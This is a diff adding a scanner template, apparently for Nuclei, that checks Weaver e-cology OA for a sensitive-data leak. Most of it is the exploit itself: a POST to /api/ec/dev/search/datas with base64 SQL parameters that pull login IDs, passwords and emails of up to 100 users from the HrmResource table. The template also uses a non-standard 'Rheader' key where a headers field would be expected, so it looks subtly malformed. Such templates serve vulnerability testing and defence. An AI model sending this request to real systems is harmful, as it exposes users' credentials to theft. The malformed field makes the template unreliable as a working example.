@@ -1,0 +1,35 @@
+id: e-cology datas 信息泄露
+time: '2021-04-08'
+
+info:
+  name: e-cology datas 信息泄露
+  author: pikpikcu
+  description: 泛微 e-cology datas 存在敏感信息泄漏漏洞 ，攻击者通过漏洞可以获取OA中的用户敏感信息
+  reference: https://www.hackjie.com/docs/3298.html
+  severity: high
+
+http:
+  - method: 
+      - POST
+    path:
+      - "{{BaseURL}}/api/ec/dev/search/datas"
+    body:
+      - |
+        "type=&sqlParams={"tFields":"Kg==","tFrom":"SHJtUmVzb3VyY2U=","tOrder":"aWQ=","tWhere":""}&columns=[{"dataIndex":"loginid"},{"dataIndex":"password"},{"dataIndex":"email"},{"dataIndex":"id"}]&sumCloumns=&min=0&max=100"
+    
+    Rheader: 
+      - Content-Type:application/x-www-form-urlencoded;
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "passwordspan"
+          - "password"
+          - "datas"
+        condition: and
+
+      - type: status
+        status:
+          - 200
